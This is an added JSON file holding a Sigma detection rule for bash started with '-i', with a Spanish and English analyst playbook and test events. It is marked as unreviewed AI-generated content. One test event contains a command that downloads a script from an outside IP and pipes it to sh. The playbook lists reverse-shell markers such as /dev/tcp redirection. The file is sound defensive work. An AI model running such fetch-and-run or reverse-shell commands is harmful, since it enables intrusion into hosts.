@@ -1,0 +1,128 @@
+{
+  "rule": {
+    "id": "6104e693-a7d6-4891-86cb-49a258523559",
+    "title": "Bash Interactive Shell",
+    "level": "low",
+    "status": "test",
+    "author": "@d4ns4n_",
+    "path": "linux/process_creation/proc_creation_lnx_bash_interactive_shell.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/linux/process_creation/proc_creation_lnx_bash_interactive_shell.yml",
+    "license": "DRL-1.1",
+    "techniques": []
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó bash con la opción interactiva \"-i\" en un host Linux. Esta opción aparece con frecuencia en reverse shells de una línea, por lo que conviene confirmar quién la lanzó y desde qué proceso padre.",
+      "what_it_detects": "Eventos de process_creation en Linux donde Image termina en '/bash' y CommandLine contiene ' -i ' (con un espacio antes y después), por ejemplo 'bash -i -c ...' o 'bash -i >& ...'.",
+      "why_it_matters": "Un atacante con ejecución de comandos (por ejemplo, desde una aplicación web vulnerable) suele usar 'bash -i' para obtener una shell interactiva y redirigirla a un host remoto. Corresponde a ejecución mediante intérprete de comandos Unix (ATT&CK Execution, T1059.004).",
+      "triage_steps": [
+        "Revise CommandLine completo: busque redirecciones a /dev/tcp o /dev/udp, '>&', '0>&1', IP o puertos externos, o descargas con curl/wget encadenadas.",
+        "Identifique ParentImage y ParentCommandLine: un padre como apache2, nginx, php-fpm, java, python o node es altamente sospechoso; una terminal o sshd suele ser legítimo.",
+        "Verifique el usuario: cuentas de servicio como www-data, tomcat o postgres no deberían iniciar shells interactivas.",
+        "Correlacione conexiones de red salientes del mismo host dentro de +/- 15 minutos, en especial hacia el puerto o IP presente en CommandLine.",
+        "Enumere los procesos hijos de este bash y la actividad posterior: reconocimiento (id, whoami, uname), persistencia (crontab, authorized_keys) o escalamiento (sudo, su).",
+        "Busque alertas previas del mismo host o usuario, como explotación web o acceso inicial en logs del servidor de aplicaciones."
+      ],
+      "false_positives": [
+        "Administradores o scripts que lanzan 'bash -i -c' para cargar el .bashrc y sus alias antes de ejecutar un comando.",
+        "Herramientas de desarrollo, IDE remotos, contenedores o tmux/screen que abren shells interactivas con argumentos adicionales.",
+        "Ejercicios autorizados de pentesting o red team."
+      ],
+      "response_steps": [
+        "Verifique con el responsable del host o del usuario si la ejecución era esperada antes de actuar.",
+        "Si hay indicios de reverse shell, aísle el host de la red y bloquee la IP o el dominio remoto en el perímetro.",
+        "Termine el proceso bash y sus hijos solo después de capturar su árbol de procesos, conexiones y memoria si es posible.",
+        "Identifique y corrija el vector de entrada (aplicación vulnerable, credenciales comprometidas) y elimine la persistencia encontrada.",
+        "Rote credenciales expuestas en el host y monitoree actividad similar en otros servidores."
+      ],
+      "severity_rationale": "Es nivel bajo porque 'bash -i' también tiene usos legítimos de administración, pero sube de prioridad si el padre es un servicio o si CommandLine muestra redirección de red."
+    },
+    "en": {
+      "summary": "Bash was executed with the interactive \"-i\" flag on a Linux host. This flag is common in one-line reverse shells, so confirm who launched it and from which parent process.",
+      "what_it_detects": "Linux process_creation events where Image ends with '/bash' and CommandLine contains ' -i ' (space before and after), for example 'bash -i -c ...' or 'bash -i >& ...'.",
+      "why_it_matters": "Attackers with command execution, for example through a vulnerable web application, often use 'bash -i' to get an interactive shell redirected to a remote host. This is Unix shell command execution (ATT&CK Execution, T1059.004).",
+      "triage_steps": [
+        "Read the full CommandLine: look for redirection to /dev/tcp or /dev/udp, '>&', '0>&1', external IPs or ports, or chained curl/wget downloads.",
+        "Check ParentImage and ParentCommandLine: apache2, nginx, php-fpm, java, python or node parents are highly suspicious; a terminal or sshd is usually benign.",
+        "Check the user: service accounts such as www-data, tomcat or postgres should not start interactive shells.",
+        "Correlate outbound network connections from the same host within +/- 15 minutes, especially to any IP or port in CommandLine.",
+        "List child processes of this bash and follow-on activity: reconnaissance (id, whoami, uname), persistence (crontab, authorized_keys) or escalation (sudo, su).",
+        "Look for earlier alerts on the same host or user, such as web exploitation or initial access in application server logs."
+      ],
+      "false_positives": [
+        "Admins or scripts running 'bash -i -c' to load .bashrc aliases before a command.",
+        "Developer tooling, remote IDEs, containers or tmux/screen opening interactive shells with extra arguments.",
+        "Authorized penetration tests or red team exercises."
+      ],
+      "response_steps": [
+        "Confirm with the host or account owner whether the execution was expected before acting.",
+        "If a reverse shell is likely, isolate the host and block the remote IP or domain at the perimeter.",
+        "Kill the bash process and its children only after capturing the process tree, connections and, if possible, memory.",
+        "Find and fix the entry vector (vulnerable app, stolen credentials) and remove any persistence found.",
+        "Rotate credentials exposed on the host and hunt for similar activity on other servers."
+      ],
+      "severity_rationale": "Low fits because 'bash -i' has legitimate admin uses, but priority rises when the parent is a service or CommandLine shows network redirection."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "Web server worker spawns an interactive bash running reconnaissance commands as www-data.",
+        "event": {
+          "Image": "/usr/bin/bash",
+          "CommandLine": "bash -i -c 'id; uname -a'",
+          "ParentImage": "/usr/sbin/php-fpm8.1",
+          "ParentCommandLine": "php-fpm: pool www",
+          "User": "www-data",
+          "ProcessId": 48213,
+          "Computer": "web-01"
+        }
+      },
+      {
+        "description": "Python process launches an interactive bash that downloads and runs a script from a remote host.",
+        "event": {
+          "Image": "/bin/bash",
+          "CommandLine": "/bin/bash -i -c 'curl -s http://198.51.100.7/s.sh | sh'",
+          "ParentImage": "/usr/bin/python3",
+          "ParentCommandLine": "python3 /opt/app/worker.py",
+          "User": "appsvc",
+          "ProcessId": 51077,
+          "Computer": "app-02"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Login interactive shell using combined flags '-il'; CommandLine has no ' -i ' with a trailing space.",
+        "event": {
+          "Image": "/usr/bin/bash",
+          "CommandLine": "/bin/bash -il",
+          "ParentImage": "/usr/sbin/sshd",
+          "ParentCommandLine": "sshd: jperez@pts/0",
+          "User": "jperez",
+          "ProcessId": 30122,
+          "Computer": "bastion-01"
+        }
+      },
+      {
+        "description": "Interactive zsh with '-i'; Image does not end with '/bash'.",
+        "event": {
+          "Image": "/usr/bin/zsh",
+          "CommandLine": "zsh -i -c ls",
+          "ParentImage": "/usr/bin/tmux",
+          "ParentCommandLine": "tmux new -s dev",
+          "User": "mrojas",
+          "ProcessId": 30455,
+          "Computer": "dev-07"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T03:07:27+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
